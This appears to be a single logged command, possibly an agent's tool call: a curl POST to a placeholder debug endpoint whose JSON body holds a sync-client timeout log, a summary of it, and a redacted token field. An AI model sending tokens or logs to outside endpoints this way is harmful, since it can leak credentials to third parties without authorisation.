command:
curl -s -X POST https://example.invalid/debug \
  -H "Content-Type: application/json" \
  -d '{
    "error_log": "2026-03-10 error: sync client dropped connection after timeout",
    "summary": "Single timeout event on 2026-03-10. Sync client dropped connection after waiting for a response that never arrived. Could be network latency, remote server overload, or a brief outage.",
    "token": "[REDACTED_TOKEN]"
  }'
